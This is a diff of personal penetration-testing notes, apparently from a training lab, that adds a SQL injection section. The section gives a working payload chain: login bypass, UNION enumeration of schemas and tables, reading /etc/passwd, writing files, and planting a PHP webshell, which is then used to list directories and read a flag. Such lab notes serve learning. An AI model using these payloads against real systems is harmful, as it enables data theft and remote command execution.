@@ -19,16 +19,15 @@
     - [Medium Lab](#medium-lab)
     - [Medium Hard](#medium-hard)
   - [PowerView](#powerview)
+  - [SQL Injection Fundamentals](#sql-injection-fundamentals)
 
 
 TODOS:
-- Shells & Payloads
 - AD Enumeration & Attack
 - AD LDAP
 - Kerberos Attack
 - Active Directory LDAP
-- AD PowerView
-  - Boxes: AD Active, Resolute, Forest Cascate
+- Boxes: AD Active, Resolute, Forest Cascate
   - [Walkthroughs](https://0xdf.gitlab.io/tags.html#active-directory)
   - [Good blog](https://adsecurity.org/?author=2)
 - Documentation
@@ -876,35 +875,94 @@ end
 
 *Result:* Name of the manager
 
----
 
-*Command:*
+## SQL Injection Fundamentals
 
-*Result:* 
+*Command:* Login bypass, source PayloadAllThethings
+- ' or 1=1 limit 1 -- -+
 
----
-
-*Command:*
-
-*Result:* 
+*Result:* Logged in
 
 ---
 
-*Command:*
+*Command:* Identify how manu columns 
+- A'ORDER BY 5-- -
 
-*Result:* 
-
----
-
-*Command:*
-
-*Result:* 
+*Result:* Five columns
 
 ---
 
-*Command:*
+*Command:* Identify databases
+- A'UNION SELECT 1,SCHEMA_NAME,@@version,4,5 FROM INFORMATION_SCHEMA.SCHEMATA-- -
 
-*Result:* 
+*Result:* ilfreight, backup
 
 ---
+
+*Command:* Current databases
+- A'UNION SELECT 1,user(),@@version,4,5-- -
+  
+*Result:* ilfreight
+
+---
+
+*Command:* Tables at ilfreight + backup
+- A'UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4,5 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='ilfreight'-- -
+- A'UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4,5 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='backup'-- -
+- 
+*Result:* users, payment + admin_bk
+
+---
+
+*Command:* Columns at admin_bk
+- A'UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5 FROM INFORMATION_SCHEMA.columns WHERE table_schema='backup'-- -
+
+*Result:* username,password
+
+---
+
+*Command:* Content of table admin_bk
+
+*Result:* Username:password
+
+---
+
+*Command:* Current user with super_privilege
+- 'UNION SELECT 1,super_priv,3,4 FROM mysql.user-- -
+
+*Result:* Super privilege
+
+---
+
+*Command:* Read file + FILE
+- 'UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5-- -
+- 'UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges-- -
+  
+*Result:* Access to /etc/passwd + write files
+
+---
+
+*Command:* We can write files
+- 'UNION SELECT "",'blablabla',"","","" INTO OUTFILE '/var/www/html/dashboard/proof.txt'-- -
+
+*Result:* $TARGET:PORT/dashboard/proof.txt = our file
+
+---
+
+*Command:* Upload webshell
+- 'UNION SELECT "","","<?php system($_GET['cmd']); ?>","","" into outfile "/var/www/html/dashboard/shell.php"-- -
+
+*Result:* Access to shell = http://94.237.58.188:38760/dashboard/shell.php?cmd=whoami
+
+---
+
+*Command:* find flag + read file
+- http://94.237.58.188:38760/dashboard/shell.php?cmd=ls+/
+- http://94.237.58.188:38760/dashboard/shell.php?cmd=cat+/flag_cae1dadcd174.txt
+  
+*Result:* Flag
+
+---
+
+
 
